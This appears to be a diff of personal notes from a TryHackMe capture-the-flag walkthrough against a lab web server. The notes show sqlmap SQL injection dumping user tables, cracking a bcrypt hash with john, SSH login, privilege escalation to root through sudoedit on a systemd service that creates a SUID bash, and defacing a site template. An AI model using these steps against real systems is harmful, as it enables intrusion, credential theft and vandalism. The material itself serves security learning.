@@ -436,3 +436,442 @@ Parameter: #1* (URI)
     Type: UNION query
     Title: Generic UNION query (NULL) - 8 columns
     Payload: http://10.10.124.107:80/products/-1946 UNION ALL SELECT 62,CONCAT(0x716a767a71,0x5973754c534c48716e414741544b69716f6f7a484150425a4955584f757142544566436251575849,0x7162707871),62,62,62,62,62,62-- -
+---
+[14:22:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.0.12
+[14:22:03] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[14:22:03] [INFO] fetching current database
+[14:22:04] [INFO] fetching tables for database: 'duckyinc'
+[14:22:04] [INFO] fetching columns for table 'user' in database 'duckyinc'
+[14:22:05] [INFO] fetching entries for table 'user' in database 'duckyinc'
+Database: duckyinc
+Table: user
+[10 entries]
++----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+| id | email                           | company          | username | _password                                                    | credit_card                |
++----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
+| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
+| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
+| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
+| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
+| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
+| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
+| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
+| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
+| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
++----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+
+[14:22:05] [INFO] table 'duckyinc.`user`' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.124.107/dump/duckyinc/user.csv'
+[14:22:05] [INFO] fetching columns for table 'system_user' in database 'duckyinc'
+[14:22:06] [INFO] fetching entries for table 'system_user' in database 'duckyinc'
+Database: duckyinc
+Table: system_user
+[3 entries]
++----+----------------------+--------------+--------------------------------------------------------------+
+| id | email                | username     | _password                                                    |
++----+----------------------+--------------+--------------------------------------------------------------+
+| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
+| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
+| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
++----+----------------------+--------------+--------------------------------------------------------------+
+
+[14:22:06] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.124.107/dump/duckyinc/system_user.csv'
+[14:22:06] [INFO] fetching columns for table 'product' in database 'duckyinc'
+[14:22:06] [INFO] fetching entries for table 'product' in database 'duckyinc'
+Database: duckyinc
+Table: product
+[4 entries]
++----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
+| id | cost     | name                  | price    | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |
++----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
+| 1  | 50.00    | Box of Duckies        | 35.00    | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |
+| 2  | 500.00   | Dozen of Duckies      | 600.00   | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |
+| 3  | 800.00   | Pallet of Duckies     | 1000.00  | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |
+| 4  | 15000.00 | Truck Load of Duckies | 22000.00 | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\r\n\r\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |
++----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
+
+[14:22:07] [INFO] table 'duckyinc.product' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.124.107/dump/duckyinc/product.csv'
+[14:22:07] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 81 times
+[14:22:07] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.124.107'
+
+[*] ending @ 14:22:07 //
+
+┌──(witty㉿kali)-[/tmp]
+└─$ echo '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a' > hash
+                                                                                                                                                                   
+┌──(witty㉿kali)-[/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 256 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+inuyasha         (?)     
+1g 0:00:00:01 DONE () 0.6172g/s 155.5p/s 155.5c/s 155.5C/s hellokitty..edward
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+server-admin : inuyasha (ssh)
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh server-admin@10.10.124.107 
+The authenticity of host '10.10.124.107 (10.10.124.107)' can't be established.
+ED25519 key fingerprint is SHA256:TQ86zGh+CjOLHbL41BszBXVekLEpibum8BrA6AYnqIA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.124.107' (ED25519) to the list of known hosts.
+server-admin@10.10.124.107's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+8 packages can be updated.
+0 updates are security updates.
+
+################################################################################
+#			 Ducky Inc. Web Server 00080012			       #
+#	     This server is for authorized Ducky Inc. employees only	       #
+#		   All actiions are being monitored and recorded	       #
+#		     IP and MAC addresses have been logged		       #
+################################################################################
+Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
+server-admin@duckyinc:~$ whoami;pwd
+server-admin
+/home/server-admin
+
+server-admin@duckyinc:~$ ls -lah
+total 44K
+drwxr-xr-x 5 server-admin server-admin 4.0K Aug 12  2020 .
+drwxr-xr-x 3 root         root         4.0K Aug 10  2020 ..
+lrwxrwxrwx 1 root         root            9 Aug 10  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 server-admin server-admin  220 Aug 10  2020 .bash_logout
+-rw-r--r-- 1 server-admin server-admin 3.7K Aug 10  2020 .bashrc
+drwx------ 2 server-admin server-admin 4.0K Aug 10  2020 .cache
+-rw-r----- 1 server-admin server-admin   18 Aug 10  2020 flag2.txt
+drwx------ 3 server-admin server-admin 4.0K Aug 10  2020 .gnupg
+-rw------- 1 root         root           31 Aug 10  2020 .lesshst
+drwxr-xr-x 3 server-admin server-admin 4.0K Aug 10  2020 .local
+-rw-r--r-- 1 server-admin server-admin  807 Aug 10  2020 .profile
+-rw-r--r-- 1 server-admin server-admin    0 Aug 10  2020 .sudo_as_admin_successful
+-rw------- 1 server-admin server-admin 2.9K Aug 12  2020 .viminfo
+server-admin@duckyinc:~$ cat flag2.txt 
+thm{4lm0st_th3re}
+
+server-admin@duckyinc:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
+-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root             43K Mar  5  2020 /bin/mount
+-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root   root             27K Mar  5  2020 /bin/umount
+-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/9665/bin/mount
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9665/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9665/bin/ping6
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9665/bin/su
+-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/9665/bin/umount
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/9665/usr/bin/chfn
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9665/usr/bin/chsh
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/9665/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/9665/usr/bin/passwd
+-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/9665/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            419K May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root            109K Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Feb 11  2020 /snap/core/9665/usr/sbin/pppd
+-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/9804/bin/mount
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9804/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9804/bin/ping6
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9804/bin/su
+-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/9804/bin/umount
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/9804/usr/bin/chfn
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9804/usr/bin/chsh
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/9804/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/9804/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/9804/usr/bin/passwd
+-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/9804/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            419K May 26  2020 /snap/core/9804/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root            109K Jul 29  2020 /snap/core/9804/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Feb 11  2020 /snap/core/9804/usr/sbin/pppd
+-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root            146K Jan 31  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root   messagebus       42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root   root            111K Jul 10  2020 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+server-admin@duckyinc:~$ sudo -l
+[sudo] password for server-admin: 
+Matching Defaults entries for server-admin on duckyinc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User server-admin may run the following commands on duckyinc:
+    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable
+        duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl
+        daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
+
+https://gtfobins.github.io/gtfobins/systemctl/
+
+server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service
+[Unit]
+Description=Gunicorn instance to serve DuckyInc Webapp
+After=network.target
+
+[Service]
+User=flask-app
+Group=www-data
+WorkingDirectory=/var/www/duckyinc
+ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
+ExecReload=/bin/kill -s HUP $MAINPID
+ExecStop=/bin/kill -s TERM $MAINPID
+
+[Install]
+WantedBy=multi-user.target
+
+server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
+server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service 
+[Unit]
+Description=Gunicorn instance to serve DuckyInc Webapp
+After=network.target
+
+[Service]
+User=root
+Group=root
+WorkingDirectory=/var/www/duckyinc
+ExecStart=/bin/bash /tmp/ducky.sh
+ExecReload=/bin/kill -s HUP $MAINPID
+ExecStop=/bin/kill -s TERM $MAINPID
+
+[Install]
+WantedBy=multi-user.target
+
+server-admin@duckyinc:~$ cd /tmp
+server-admin@duckyinc:/tmp$ ls
+systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-resolved.service-5I3qaT
+systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-timesyncd.service-FHfynY
+server-admin@duckyinc:/tmp$ nano ducky.sh
+server-admin@duckyinc:/tmp$ cat ducky.sh 
+#!/bin/bash
+cp /bin/bash /tmp/sh
+chmod +xs /tmp/sh
+
+server-admin@duckyinc:/tmp$ sudo /bin/systemctl daemon-reload
+server-admin@duckyinc:/tmp$ sudo /bin/systemctl restart duckyinc.service
+server-admin@duckyinc:/tmp$ ls 
+ducky.sh  systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-resolved.service-5I3qaT
+sh        systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-timesyncd.service-FHfynY
+
+server-admin@duckyinc:/tmp$ ls -l
+total 1100
+-rw-rw-r-- 1 server-admin server-admin      51 Mar 12 18:50 ducky.sh
+-rwsr-sr-x 1 root         root         1113504 Mar 12 18:53 sh
+drwx------ 3 root         root            4096 Mar 12 18:04 systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-resolved.service-5I3qaT
+drwx------ 3 root         root            4096 Mar 12 18:04 systemd-private-aa64e3e936fe4b02a8e203e0941d434b-systemd-timesyncd.service-FHfynY
+
+server-admin@duckyinc:/tmp$ /tmp/sh -p
+sh-4.4# whoami
+root
+sh-4.4# cd /root
+sh-4.4# ls
+sh-4.4# ls -lah
+total 52K
+drwx------  7 root root 4.0K Aug 28  2020 .
+drwxr-xr-x 24 root root 4.0K Aug  9  2020 ..
+drwxr-xr-x  2 root root 4.0K Aug 12  2020 .bash_completion.d
+lrwxrwxrwx  1 root root    9 Aug 10  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3.2K Aug 12  2020 .bashrc
+drwx------  3 root root 4.0K Aug  9  2020 .cache
+drwx------  3 root root 4.0K Aug  9  2020 .gnupg
+drwxr-xr-x  5 root root 4.0K Aug 12  2020 .local
+-rw-------  1 root root  485 Aug 10  2020 .mysql_history
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Aug 10  2020 .selected_editor
+drwx------  2 root root 4.0K Aug  9  2020 .ssh
+-rw-------  1 root root 7.6K Aug 12  2020 .viminfo
+sh-4.4# cd .bash_completion.d
+sh-4.4# ls
+python-argcomplete
+sh-4.4# cat python-argcomplete
+```
+```text
+# Copyright 2012-2019, Andrey Kislyuk and argcomplete contributors.
+```
+```text
+# Licensed under the Apache License. See https://github.com/kislyuk/argcomplete for more info.
+```
+```text
+# Copy of __expand_tilde_by_ref from bash-completion
+__python_argcomplete_expand_tilde_by_ref () {
+    if [ "${!1:0:1}" = "~" ]; then
+        if [ "${!1}" != "${!1//\/}" ]; then
+            eval $1="${!1/%\/*}"/'${!1#*/}';
+        else
+            eval $1="${!1}";
+        fi;
+    fi
+}
+```
+```text
+# Run something, muting output or redirecting it to the debug stream
+```
+```text
+# depending on the value of _ARC_DEBUG.
+```
+```text
+# If ARGCOMPLETE_USE_TEMPFILES is set, use tempfiles for IPC.
+__python_argcomplete_run() {
+    if [[ -z "$ARGCOMPLETE_USE_TEMPFILES" ]]; then
+        __python_argcomplete_run_inner "$@"
+        return
+    fi
+    local tmpfile="$(mktemp)"
+    _ARGCOMPLETE_STDOUT_FILENAME="$tmpfile" __python_argcomplete_run_inner "$@"
+    local code=$?
+    cat "$tmpfile"
+    rm "$tmpfile"
+    return $code
+}
+
+__python_argcomplete_run_inner() {
+    if [[ -z "$_ARC_DEBUG" ]]; then
+        "$@" 8>&1 9>&2 1>/dev/null 2>&1
+    else
+        "$@" 8>&1 9>&2 1>&9 2>&1
+    fi
+}
+```
+```text
+# Scan the beginning of an executable file ($1) for a regexp ($2). By default,
+```
+```text
+# scan for the magic string indicating that the executable supports the
+```
+```text
+# argcomplete completion protocol. By default, scan the first kilobyte;
+```
+```text
+# if $3 is set to -n, scan until the first line break up to a kilobyte.
+__python_argcomplete_scan_head() {
+    read -s -r ${3:--N} 1024 < "$1"
+    [[ "$REPLY" =~ ${2:-PYTHON_ARGCOMPLETE_OK} ]]
+}
+
+__python_argcomplete_scan_head_noerr() {
+    __python_argcomplete_scan_head "$@" 2>/dev/null
+}
+
+_python_argcomplete_global() {
+    local executable=$1
+    __python_argcomplete_expand_tilde_by_ref executable
+
+    local ARGCOMPLETE=0
+    if [[ "$executable" == python* ]] || [[ "$executable" == pypy* ]]; then
+        if [[ "${COMP_WORDS[1]}" == -m ]]; then
+            if __python_argcomplete_run "$executable" -m argcomplete._check_module "${COMP_WORDS[2]}"; then
+                ARGCOMPLETE=3
+            else
+                return
+            fi
+        elif [[ -f "${COMP_WORDS[1]}" ]] && __python_argcomplete_scan_head_noerr "${COMP_WORDS[1]}"; then
+            local ARGCOMPLETE=2
+        else
+            return
+        fi
+    elif type -P "$executable" >/dev/null 2>&1; then
+        local SCRIPT_NAME=$(type -P "$executable")
+        if (type -t pyenv && [[ "$SCRIPT_NAME" = $(pyenv root)/shims/* ]]) >/dev/null 2>&1; then
+            local SCRIPT_NAME=$(pyenv which "$executable")
+        fi
+        if __python_argcomplete_scan_head_noerr "$SCRIPT_NAME"; then
+            local ARGCOMPLETE=1
+        elif __python_argcomplete_scan_head_noerr "$SCRIPT_NAME" '^#!(.*)$' -n && [[ "${BASH_REMATCH[1]}" =~ ^.*(python|pypy)[0-9\.]*$ ]]; then
+            local interpreter="$BASH_REMATCH"
+            if (__python_argcomplete_scan_head_noerr "$SCRIPT_NAME" "(PBR Generated)|(EASY-INSTALL-(SCRIPT|ENTRY-SCRIPT|DEV-SCRIPT))" \
+                && "$interpreter" "$(type -P python-argcomplete-check-easy-install-script)" "$SCRIPT_NAME") >/dev/null 2>&1; then
+                local ARGCOMPLETE=1
+            elif __python_argcomplete_run "$interpreter" -m argcomplete._check_console_script "$SCRIPT_NAME"; then
+                local ARGCOMPLETE=1
+            fi
+        fi
+    fi
+
+    if [[ $ARGCOMPLETE != 0 ]]; then
+        local IFS=$(echo -e '\v')
+        COMPREPLY=( $(_ARGCOMPLETE_IFS="$IFS" \
+            COMP_LINE="$COMP_LINE" \
+            COMP_POINT="$COMP_POINT" \
+            COMP_TYPE="$COMP_TYPE" \
+            _ARGCOMPLETE_COMP_WORDBREAKS="$COMP_WORDBREAKS" \
+            _ARGCOMPLETE=$ARGCOMPLETE \
+            _ARGCOMPLETE_SUPPRESS_SPACE=1 \
+            __python_argcomplete_run "$executable" "${COMP_WORDS[@]:1:ARGCOMPLETE-1}") )
+        if [[ $? != 0 ]]; then
+            unset COMPREPLY
+        elif [[ "$COMPREPLY" =~ [=/:]$ ]]; then
+            compopt -o nospace
+        fi
+    else
+        type -t _completion_loader | grep -q 'function' && _completion_loader "$@"
+    fi
+}
+complete -o default -o bashdefault -D -F _python_argcomplete_global
+
+need to deface it
+
+sh-4.4# ls /var/www/
+duckyinc
+sh-4.4# ls /var/www/duckyinc/
+app.py	__pycache__  requirements.txt  static  templates
+sh-4.4# ls /var/www/duckyinc/templates
+404.html  500.html  admin.html	base.html  contact.html  index.html  login.html  product.html  products.html
+
+sh-4.4# head /var/www/duckyinc/templates/index.html
+{% extends "base.html" %}
+
+{% block content %}
+
+<div id="index-banner" class="parallax-container">
+  <div class="section no-pad-bot">
+    <div class="container">
+      <h1 class="header center white-text"><strong>Rubber Ducky Inc Defaced</strong></h1>
+      <div class="row center">
+
+sh-4.4# ls /root
+flag3.txt
+sh-4.4# cat /root/flag3.txt 
+thm{m1ss10n_acc0mpl1sh3d}
+```
+![[Pasted image 20230312132013.png]]
+flag1
+flag2
+flag3
+Mission objectives
+
+## Flags / Answers
+- ***thm{br3ak1ng_4nd_3nt3r1ng}***
+- ***thm{4lm0st_th3re}***
+- ***thm{m1ss10n_acc0mpl1sh3d}***
+
+## Notes / Lessons Learned
+[[HA Joker CTF]]
+
